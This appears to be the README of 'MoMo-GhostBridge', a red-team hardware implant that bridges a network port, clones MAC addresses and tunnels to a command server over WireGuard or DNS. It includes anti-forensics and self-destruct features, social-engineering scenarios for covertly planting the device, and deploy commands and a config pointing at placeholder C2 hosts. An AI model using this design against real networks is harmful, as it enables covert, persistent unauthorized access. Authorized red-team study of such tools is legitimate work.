# 👻 MoMo-GhostBridge

<p align="center">
  <img src="https://img.shields.io/badge/Platform-NanoPi%20R2S-orange?style=for-the-badge" alt="Platform">
  <img src="https://img.shields.io/badge/Python-3.11+-3776ab?style=for-the-badge&logo=python&logoColor=white" alt="Python">
  <img src="https://img.shields.io/badge/Status-v0.6.0-green?style=for-the-badge" alt="Status">
  <img src="https://img.shields.io/badge/Tests-145%20Passing-success?style=for-the-badge" alt="Tests">
</p>

<h3 align="center">Transparent Network Implant for Red Team Persistence</h3>

<p align="center">
  <strong>Drop it. Forget it. Own the network.</strong><br>
  Invisible Bridge • Reverse VPN • DNS Tunneling • Long-term Persistence
</p>

> ⚠️ **DEVELOPMENT STATUS**
> 
> This project is currently **under active development** and has **not been tested in a live/production environment** yet. Features are being implemented and may change. Use at your own risk and only in authorized test environments. Contributions and feedback are welcome!

<p align="center">
  <a href="https://github.com/Momo-Master/MoMo">MoMo</a> •
  <a href="https://github.com/Momo-Master/MoMo-Nexus">Nexus</a> •
  <a href="https://github.com/Momo-Master/MoMo-Mimic">Mimic</a>
</p>

---

## 🎯 What is GhostBridge?

GhostBridge is a **stealthy network implant** designed for Red Team operations. It sits between a network port and a target device (PC, printer, etc.), creating a persistent backdoor into the corporate network.

| Component | Role |
|-----------|------|
| **Wall Port** → | Network source |
| **GhostBridge** | Invisible bridge + tunnel |
| → **Target Device** | PC, Printer, etc. |
| **C2 Server** | Receives encrypted tunnel |

**Key Concept:** The device bridges traffic transparently (Layer 2) while maintaining an encrypted tunnel to your C2 server.

---

## ✨ Key Features

| Feature | Description |
|---------|-------------|
| 🌉 **Transparent Bridge** | Layer 2 bridge - invisible to network scans |
| 🎭 **MAC Cloning** | Clones target device MAC - no new device appears |
| 🔐 **Reverse VPN** | WireGuard tunnel to your C2 server |
| 🔄 **Auto-Reconnect** | Persistent connection with exponential backoff |
| 🕵️ **Stealth Mode** | No open ports, no listening services |
| 🔌 **USB Powered** | Powers from printer/PC USB port |
| 📦 **Tiny Form Factor** | Smaller than a cigarette pack |
| 🌐 **DNS Tunneling** | Covert C2 when VPN is blocked |
| 🔗 **MoMo Integration** | Full integration with MoMo platform |

---

## 🆕 DNS Tunneling (v0.6.0)

When WireGuard is blocked, GhostBridge falls back to DNS tunneling for covert communication.

| Feature | Description |
|---------|-------------|
| **Encoding** | Base32, Base64, Hex (DNS-safe) |
| **Compression** | Zlib for reduced query count |
| **Stealth** | 0x20 bit randomization, jitter |
| **Protocol** | TXT/NULL records over UDP/TCP |
| **Fallback** | WireGuard → DNS → Auto-restore |

### Fallback Chain

| Priority | Method | Port | Use Case |
|----------|--------|------|----------|
| 1 | WireGuard UDP | 51820 | Primary - fastest |
| 2 | WireGuard TCP | 443 | Firewalled networks |
| 3 | DNS Tunnel | 53 | VPN blocked |
| 4 | Auto-restore | - | Return to primary when available |

---

## 🛠️ Hardware

### Recommended: NanoPi R2S Plus

| Spec | Value |
|------|-------|
| **CPU** | Rockchip RK3328 Quad-core ARM Cortex-A53 |
| **RAM** | 1GB DDR4 |
| **Storage** | 32GB eMMC + MicroSD |
| **Network** | 2x Gigabit Ethernet (WAN + LAN) |
| **Size** | 55.6 x 52mm |
| **Power** | 5V/2A USB-C |

### Bill of Materials (~$75)

| Item | Purpose | Cost |
|------|---------|------|
| NanoPi R2S Plus | Main board | $45 |
| MicroSD Card 32GB | OS + Logs | $10 |
| Short Ethernet Cable | LAN connection | $3 |
| USB-A to USB-C Cable | Power from target | $5 |
| 3D Printed Case | Concealment | $10 |

---

## ⚔️ Attack Scenarios

### Scenario 1: Printer Drop
1. Enter office as "IT support" or cleaner
2. Find network printer in corner
3. Unplug printer's network cable from wall
4. Insert GhostBridge between wall and printer
5. Power GhostBridge from printer's USB port
6. Leave - device tunnels home automatically

### Scenario 2: Under-Desk Install
1. Social engineer access to office
2. Find target executive's desk
3. Install between wall and docking station
4. Clone docking station's MAC
5. Full access to executive's network segment

---

## 🏗️ Architecture

### Core Components

| Component | Responsibility |
|-----------|---------------|
| **Bridge Engine** | Transparent L2 bridging, MAC cloning |
| **Tunnel Manager** | WireGuard + DNS tunnel fallback |
| **Beacon System** | Heartbeat, health checks, commands |
| **Stealth Module** | Anti-forensics, log cleanup, kill switch |
| **MoMo Link** | Integration with MoMo C2 platform |

### Network Flow

| Interface | Role | IP Address |
|-----------|------|------------|
| `eth0` (WAN) | To wall port | None (bridged) |
| `eth1` (LAN) | To target | None (bridged) |
| `br0` | Bridge | None |
| `wg0` | Tunnel | 10.66.66.x |

---

## 🛡️ Stealth Features

### Network Stealth
- ✅ Layer 2 transparent bridge (no IP on bridge)
- ✅ MAC address cloning from target device
- ✅ No ARP announcements
- ✅ No listening ports (outbound only)
- ✅ Traffic timing randomization

### Host Stealth
- ✅ Encrypted filesystem (dm-crypt)
- ✅ RAM-only operation mode
- ✅ Auto log cleanup
- ✅ Kill switch on tamper detect
- ✅ Secure boot with signed images

### Anti-Forensics
- ✅ No persistent logs (tmpfs)
- ✅ Secure erase on panic
- ✅ Fake "router" identity if probed
- ✅ Self-destruct command from C2

---

## 🚀 Quick Start

### Installation

```bash
# Clone repository
git clone https://github.com/Momo-Master/Momo-GhostBridge.git
cd Momo-GhostBridge

# Create virtual environment
python3 -m venv .venv
source .venv/bin/activate  # Linux/Mac
# .venv\Scripts\activate   # Windows

# Install dependencies
pip install -e ".[dev]"

# Run tests
pytest tests/ -v

# Generate config
ghostbridge config generate -o config.yml
```

### Deployment (NanoPi R2S)

```bash
# Quick Deploy (with C2 config)
sudo ./scripts/deploy.sh "vpn.example.com:51820" "SERVER_PUBKEY"

# Start full system
ghostbridge run
```

### CLI Commands

| Command | Description |
|---------|-------------|
| `ghostbridge run` | Run full system |
| `ghostbridge status` | Show system status |
| `ghostbridge tunnel connect` | Connect VPN tunnel |
| `ghostbridge tunnel fallback dns` | Force DNS tunnel |
| `ghostbridge stealth wipe` | Wipe logs |
| `ghostbridge stealth panic` | Emergency wipe |

---

## ⚙️ Configuration

```yaml
# /etc/ghostbridge/config.yml
network:
  bridge_name: br0
  wan_interface: eth0
  lan_interface: eth1
  clone_mac: true
  
tunnel:
  type: wireguard
  endpoint: your-c2.com:51820
  keepalive: 25
  
  # DNS Tunnel Fallback
  dns_tunnel:
    enabled: true
    domain: tunnel.example.com
    nameservers: ["8.8.8.8", "1.1.1.1"]
    encoder: base32  # base32, base64, hex
    chunk_size: 63
    query_interval: 0.5
  
beacon:
  interval: 300
  jitter: 60
  
stealth:
  ramfs_logs: true
  fake_identity: "Netgear Switch"
  panic_wipe: true
```

---

## 📂 Project Structure

```
ghostbridge/
├── src/ghostbridge/
│   ├── main.py                 # Main orchestrator
│   ├── cli.py                  # Command line interface
│   ├── core/                   # Core modules
│   │   ├── config.py           # Configuration
│   │   ├── bridge.py           # L2 Bridge
│   │   ├── tunnel.py           # Tunnel manager
│   │   └── stealth.py          # Anti-forensics
│   ├── infrastructure/
│   │   ├── network/            # Network operations
│   │   ├── wireguard/          # WireGuard tunnel
│   │   ├── dns/                # DNS tunneling (NEW)
│   │   │   ├── encoder.py      # Data encoding
│   │   │   ├── client.py       # DNS client
│   │   │   └── tunnel.py       # DNS tunnel
│   │   └── system/             # RAM disk, secure wipe
│   └── c2/                     # C2 Integration
├── scripts/                    # Shell scripts
├── services/                   # Systemd services
├── tests/                      # Test suite (145 tests)
└── docs/                       # Documentation
```

---

## 📚 Documentation

| Document | Description |
|----------|-------------|
| [ARCHITECTURE.md](docs/ARCHITECTURE.md) | Technical architecture |
| [DEPLOYMENT.md](docs/DEPLOYMENT.md) | Deployment guide |
| [OPERATIONS.md](docs/OPERATIONS.md) | Operational security |
| [ROADMAP.md](docs/ROADMAP.md) | Development roadmap |

---

## 🌐 MoMo Ecosystem

| Project | Description | Platform | Status |
|---------|-------------|----------|--------|
| [**MoMo**](https://github.com/Momo-Master/MoMo) | WiFi/BLE/SDR Audit Platform | Pi 5 | ✅ v1.5.2 |
| [**MoMo-Nexus**](https://github.com/Momo-Master/MoMo-Nexus) | Central C2 Hub | Pi 4 | ✅ v1.0.0 |
| [**MoMo-GhostBridge**](https://github.com/Momo-Master/Momo-GhostBridge) | Network Implant | NanoPi R2S | ✅ v0.6.0 |
| [**MoMo-Mimic**](https://github.com/Momo-Master/MoMo-Mimic) | USB Attack Platform | Pi Zero 2W | ✅ v1.0.0 |

---

## ⚠️ Legal Disclaimer

**GhostBridge is designed for authorized Red Team operations and security research only.**

- Only deploy on networks you own or have explicit written authorization to test
- Unauthorized deployment is illegal in most jurisdictions
- The developers are not responsible for misuse of this tool
- Always obtain proper authorization before any engagement

---

## 📜 License

This project is part of the MoMo ecosystem and is licensed under the **MIT License**.

---

<p align="center">
  <strong>Part of the 🔥 MoMo Ecosystem</strong><br>
  <sub>Offensive Security Toolkit for Red Teams</sub>
</p>

<p align="center">
  <a href="https://github.com/Momo-Master/MoMo">MoMo</a> •
  <a href="https://github.com/Momo-Master/MoMo-Nexus">Nexus</a> •
  <a href="https://github.com/Momo-Master/Momo-GhostBridge">GhostBridge</a> •
  <a href="https://github.com/Momo-Master/MoMo-Mimic">Mimic</a>
</p>
